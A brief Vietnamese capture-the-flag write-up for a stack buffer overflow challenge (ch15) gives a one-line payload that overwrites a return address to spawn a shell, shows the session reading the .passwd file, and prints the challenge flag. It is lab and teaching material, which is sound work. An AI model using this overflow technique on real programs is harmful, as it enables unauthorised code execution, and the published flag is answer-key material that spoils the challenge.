# Source

[Source](./ch15.c)

[Binary File](./ch15)

# Solve

- Tương tự với [bài 1](./../ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%201/), bài này sẽ dùng payload tương tự:
`cat <( python2 -c "print 'A'*128 + '\x16\x85\x04\x08'") - | ./ch15`

```bash
app-systeme-ch15@challenge02:~$ cat <( python2 -c "print 'A'*128 + '\x16\x85\x04\x08'") - | ./ch15
ls   
ch15  ch15.c  Makefile
cat .passwd
B33r1sSoG0oD4y0urBr4iN
```

### 🚩Flag: `B33r1sSoG0oD4y0urBr4iN`